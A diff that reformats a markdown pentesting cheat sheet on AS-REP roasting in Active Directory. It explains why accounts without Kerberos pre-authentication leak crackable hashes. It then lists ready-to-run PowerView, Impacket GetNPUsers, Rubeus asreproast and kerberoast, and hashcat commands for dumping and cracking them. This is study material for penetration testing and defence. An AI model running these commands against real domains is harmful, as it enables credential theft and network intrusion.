@@ -1,4 +1,5 @@
-AS-REP roasting (Dumping users hashes , pre authentication disabled)
+## AS-REP roasting (Dumping users hashes , pre authentication disabled)
+```
 Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.
 
 Rubeus automatically enumerate eligible users havingpre authrntication disabled whereas impacket requires us to give a list of users
@@ -10,7 +11,7 @@ Using PowerView.ps1
     Get-DomainUser -PreauthNotRequired Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 
     Using Impacket (REmotely without authentication)
-we require list of usernames on target. we can find those from kerbrute and supply here
+    we require list of usernames on target. we can find those from kerbrute and supply here
 
     Without AUthentication
     sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py domain.name/ -dc-ip IPADDRESS -users kerbuser.txt -no-pass
@@ -85,4 +86,4 @@ PS C:\mute> .\Rubeus.exe asreproast /nowrap
 PS C:\mute> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast <-- Might as well do a quick kerberoast while your cooking.
 
 kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-
+```
